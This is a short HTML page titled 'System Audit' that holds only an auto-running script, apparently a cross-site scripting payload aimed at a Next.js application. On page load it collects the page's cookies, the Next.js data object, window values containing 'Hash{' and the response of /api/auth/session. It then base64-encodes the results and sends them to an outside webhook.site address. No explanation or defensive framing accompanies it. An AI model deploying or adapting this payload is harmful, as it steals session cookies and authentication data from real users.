<!DOCTYPE html>
<html>
<head><title>System Audit</title></head>
<body>
    <script>
      (async function() {
    const webhook = 'https://webhook.site/645df2ce-54f8-48f5-bb51-3d8a9076cc40';
    
    let exfil = {
        memo: "Targeting Next.js State",
        cookies: document.cookie,
        // This targets the specific Next.js internal cache where data is stored
        nextData: window.__NEXT_DATA__ || "No Next Data",
        // This searches the entire window object for anything containing "Hash{"
        search: Object.keys(window).filter(key => JSON.stringify(window[key]).includes('Hash{'))
    };

    // Also, let's try to fetch the specific API that the AuthProvider uses
    try {
        const authReq = await fetch('/api/auth/session');
        exfil.authSession = await authReq.json();
    } catch(e) {}

    fetch(webhook, {
        method: 'POST',
        body: btoa(JSON.stringify(exfil))
    });
})();
    </script>
</body>
</html>
